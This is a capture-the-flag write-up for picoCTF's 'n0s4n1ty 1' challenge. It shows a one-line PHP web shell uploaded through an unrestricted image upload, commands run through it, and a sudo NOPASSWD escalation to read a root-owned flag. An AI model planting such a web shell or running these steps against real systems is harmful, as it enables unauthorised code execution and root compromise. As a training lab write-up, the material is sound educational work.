# picoCTF 2025 — n0s4n1ty 1 (Web Exploitation)

**Challenge Description:**  
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. The goal is to exploit the upload and retrieve the hidden flag from the `/root` directory.

---

## Walkthrough

At first, I see a basic upload button and an input where I can insert an image. That input is just the standard browse button. I test it by uploading a simple image, which takes me to `/upload.php`. I check the console and the network tab, but I don’t notice anything strange.

Next, I run Gobuster to check for hidden directories. Since this is an easy CTF, I used the Seclists `raft-small-files.txt` wordlist:

```bash
gobuster dir \
  -u http://standard-pizzas.picoctf.net:59916/uploads/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt \
  -x php,txt,jpg,png \
  -t 30 -s 200,204,301,302,307,403
```

Sure enough, I notice that there’s a hidden `/uploads` directory, which matches the hint in the problem description. But when I visit `/uploads`, I get a **403 Forbidden** error — I can’t list the files directly.

Since the challenge description mentioned a flaw in the upload functionality, I try uploading a `.txt` file instead of an image. It works! That means I can upload arbitrary file types. From there, I decide to create a PHP file to gain command execution.

I make a file called `attack.php` containing:

```php
<?php system($_GET["cmd"]); ?>
```

I upload it through `curl` to `/upload.php`. The server responds with **200 OK**, meaning the file was uploaded successfully. Even though directory listing is blocked, I can still access files directly. Navigating to `/uploads/attack.php` works as expected.

Now, I can pass commands using the `cmd` parameter. For example:

```
http://standard-pizzas.picoctf.net:59916/uploads/attack.php?cmd=id
```

returns the current user: `www-data`.

---

## Privilege Escalation

To escalate privileges, I check `sudo -l`:

```
http://standard-pizzas.picoctf.net:59916/uploads/attack.php?cmd=sudo%20-n%20-l
```

The output is:

```
Matching Defaults entries for www-data on challenge:
  env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User www-data may run the following commands on challenge:
  (ALL) NOPASSWD: ALL
```

This means the web user can run **any command as root without a password**. Essentially, I already have full root access.

So, the final step is simple — just read the flag from `/root/flag.txt`:

```
http://standard-pizzas.picoctf.net:59916/uploads/attack.php?cmd=sudo%20cat%20/root/flag.txt
```

And that gives me the flag 🎉

---

## Conclusion

The vulnerability came from unrestricted file uploads that allowed arbitrary PHP code execution. Combined with overly permissive `sudo` settings (`NOPASSWD: ALL`), privilege escalation was trivial. Uploading a simple PHP shell was enough to gain root and retrieve the flag.

This was a fun challenge that highlights why file upload validation and proper privilege configurations are critical for web security.

---

